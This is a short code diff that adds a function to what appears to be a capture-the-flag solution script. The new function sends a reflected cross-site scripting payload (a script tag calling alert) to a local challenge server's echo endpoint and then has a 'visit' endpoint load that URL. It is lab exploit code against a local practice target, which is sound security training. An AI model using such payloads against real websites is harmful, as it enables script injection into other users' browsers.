@@ -53,3 +53,14 @@ def lv_7():
                 break
         if(ch == '}'):
             break
+
+def lv_8():
+    base_url  = 'http://challenge.localhost:80'
+    
+    echo_path = '/echo'
+    echo_args = '?echo=<script>alert("x");</script>'
+    get_GET_result(base_url + echo_path, echo_args)
+
+    visit_path = '/visit'
+    visit_args = f'?url={base_url}{echo_path}{echo_args}'
+    get_GET_result(base_url + visit_path, visit_args)
